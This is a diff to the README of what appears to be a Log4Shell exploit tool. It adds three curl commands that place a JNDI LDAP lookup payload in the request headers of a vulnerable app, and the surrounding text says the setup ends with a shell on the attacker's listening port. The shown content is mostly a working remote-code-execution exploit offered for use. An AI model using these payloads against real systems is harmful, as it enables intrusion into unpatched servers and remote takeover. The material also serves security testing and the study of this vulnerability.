@@ -38,6 +38,13 @@ Listening on 0.0.0.0:1389
 
 This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.
 
+* Working with curl. One of these version worked for me
+```sh
+curl <vuln-app> -H '${jndi:ldap://localhost:1389/a}'
+curl <vuln-app> -H 'X-Api-Version: ${jndi:ldap://localhost:1389/a}'
+curl <vuln-app> -H 'User-Agent: ${jndi:ldap://localhost:1389/a}'
+```
+
 
 ---
 
